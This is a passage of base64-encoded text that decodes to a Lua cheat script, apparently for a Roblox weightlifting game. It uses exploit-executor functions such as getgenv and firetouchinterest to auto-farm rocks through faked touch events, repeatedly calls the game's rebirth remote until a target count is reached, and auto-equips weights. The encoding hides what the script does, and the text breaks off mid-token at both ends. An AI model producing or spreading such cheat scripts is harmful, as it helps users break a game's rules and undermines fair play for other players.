oIlN0YXJ0ZXIgUm9jayIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJTdGFydGVyIElzbGFuZCBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwIHRoZW4KICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIm5lZWRlZER1cmFiaWxpdHkiIGFuZCB2LlZhbHVlID09IDEwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKClJvY2s6QWRkU3dpdGNoKCJMZWdlbmQgQmVhY2ggUm9jayIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJMZWdlbmQgQmVhY2ggUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDUwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gNTAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKClJvY2s6QWRkU3dpdGNoKCJGcm96ZW4gUm9jayIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJGcm9zdCBHeW0gUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDE1MDAwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxNTAwMDAgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGdldHRvb2woKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpSb2NrOkFkZFN3aXRjaCgiTXl0aGljYWwgUm9jayIsIGZ1bmN0aW9uKFZhbHVlKQogICAgc2VsZWN0cm9jayA9ICJNeXRoaWNhbCBHeW0gUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDQwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSA0MDAwMDAgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxlZnRIYW5kIikgYW5kIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGdldHRvb2woKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQpCgpSb2NrOkFkZFN3aXRjaCgiRXRlcm5hbCBSb2NrIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIkV0ZXJuYWwgR3ltIFJvY2siCiAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBWYWx1ZQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSA3NTAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gNzUwMDAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKUm9jazpBZGRTd2l0Y2goIkxlZ2VuZCBSb2NrIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIkxlZ2VuZCBHeW0gUm9jayIKICAgIGdldGdlbnYoKS5hdXRvRmFybSA9IFZhbHVlCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDEwMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTAwMDAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKClJvY2s6QWRkU3dpdGNoKCJNdXNjbGUgS2luZyBSb2NrIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIk11c2NsZSBLaW5nIEd5bSBSb2NrIgogICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgZ2V0Z2VudigpLmF1dG9GYXJtIGRvCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gNTAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSA1MDAwMDAwIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5SaWdodEhhbmQsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkxlZnRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBnZXR0b29sKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kKQoKUm9jazpBZGRTd2l0Y2goIkp1bmdsZSBSb2NrIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBzZWxlY3Ryb2NrID0gIkFuY2llbnQgSnVuZ2xlIFJvY2siCiAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBWYWx1ZQogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgaWYgbm90IGdldGdlbnYoKS5hdXRvRmFybSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuRHVyYWJpbGl0eS5WYWx1ZSA+PSAxMDAwMDAwMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLm1hY2hpbmVzRm9sZGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUmlnaHRIYW5kIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQogICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuTGVmdEhhbmQsIDApCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2V0dG9vbCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCkKCmxvY2FsIHJlYmlydGhUYWIgPSB3aW5kb3c6QWRkVGFiKCJSZWJpcnRocyIpCgpsb2NhbCB0YXJnZXRSZWJpcnRoQ291bnQgPSAwIC0tIERlZmluZSBoZXJlIHNvIGl0J3MgYWNjZXNzaWJsZSB3aXRoaW4gdGhlIHJlYmlydGhUYWIgc2NvcGUKCnJlYmlydGhUYWI6QWRkVGV4dEJveCgiVGFyZ2V0IFJlYmlydGggQW1vdW50IiwgZnVuY3Rpb24odHh0KQogICAgbG9jYWwgbnVtID0gdG9udW1iZXIodHh0KQogICAgaWYgbnVtIGFuZCBudW0gPj0gMCB0aGVuCiAgICAgICAgdGFyZ2V0UmViaXJ0aENvdW50ID0gbWF0aC5mbG9vcihudW0pCiAgICBlbHNlCiAgICAgICAgd2FybigiSW52YWxpZCB0YXJnZXQgcmViaXJ0aCBhbW91bnQgZW50ZXJlZDogIiAuLiB0eHQpCiAgICBlbmQKZW5kLCB7CiAgICBwbGFjZWhvbGRlciA9ICJFbnRlciB0YXJnZXQgcmViaXJ0aCBjb3VudCIsCiAgICBjbGVhcnRleHQgPSBmYWxzZQp9KQoKcmViaXJ0aFRhYjpBZGRTd2l0Y2goIkVuYWJsZSBUYXJnZXQgUmViaXJ0aCIsIGZ1bmN0aW9uKFN0YXRlKQogICAgX0cuVGFyZ2V0UmViaXJ0aEVuYWJsZWQgPSBTdGF0ZQogICAgX0cuQXV0b1JlYmlydGhFbmFibGVkID0gZmFsc2UgLS0gVHVybiBvZmYgYXV0byByZWJpcnRoIChpbmZpbml0ZSkgaWYgdGhpcyBpcyBlbmFibGVkCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjdXJyZW50UmViaXJ0aHMgPSBwbGF5ZXIubGVhZGVyc3RhdHMuUmViaXJ0aHMuVmFsdWUgLS0gQXNzdW1pbmcgbGVhZGVyc3RhdHMgaXMgdGhlIGNvcnJlY3QgcGF0aCB0byByZWJpcnRocwogICAgICAgIHdoaWxlIF9HLlRhcmdldFJlYmlydGhFbmFibGVkIGFuZCBjdXJyZW50UmViaXJ0aHMgPCB0YXJnZXRSZWJpcnRoQ291bnQgZG8KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMucmViaXJ0aFJlbW90ZTpJbnZva2VTZXJ2ZXIoInJlYmlydGhSZXF1ZXN0IikKICAgICAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgICAgIGN1cnJlbnRSZWJpcnRocyA9IHBsYXllci5sZWFkZXJzdGF0cy5SZWJpcnRocy5WYWx1ZSAtLSBVcGRhdGUgY3VycmVudCByZWJpcnRocwogICAgICAgIGVuZAogICAgICAgIGlmIF9HLlRhcmdldFJlYmlydGhFbmFibGVkIGFuZCBjdXJyZW50UmViaXJ0aHMgPj0gdGFyZ2V0UmViaXJ0aENvdW50IHRoZW4KICAgICAgICAgICAgX0cuVGFyZ2V0UmViaXJ0aEVuYWJsZWQgPSBmYWxzZSAtLSBUdXJuIG9mZiBvbmNlIHRhcmdldCBpcyByZWFjaGVkCiAgICAgICAgICAgIC0tIFlvdSBtaWdodCB3YW50IHRvIGFkZCBhIG5vdGlmaWNhdGlvbiBoZXJlIHRoYXQgdGhlIHRhcmdldCBoYXMgYmVlbiByZWFjaGVkCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkF1dG9tYXRpY2FsbHkgcmViaXJ0aHMgdW50aWwgdGFyZ2V0IGFtb3VudCBpcyByZWFjaGVkLiIpCgpyZWJpcnRoVGFiOkFkZFN3aXRjaCgiQXV0byBXZWlnaHQiLCBmdW5jdGlvbihWYWx1ZSkKICAgIF9HLkF1dG9XZWlnaHQgPSBWYWx1ZQogICAgCiAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgbG9jYWwgd2VpZ2h0VG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikKICAgICAgICBpZiB3ZWlnaHRUb29sIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wod2VpZ2h0VG9vbCkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldlaWdodCIpCiAgICAgICAgaWYgZXF1aXBwZWQgdGhlbgogICAgICAgICAgICBlcXVpcHBlZC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlb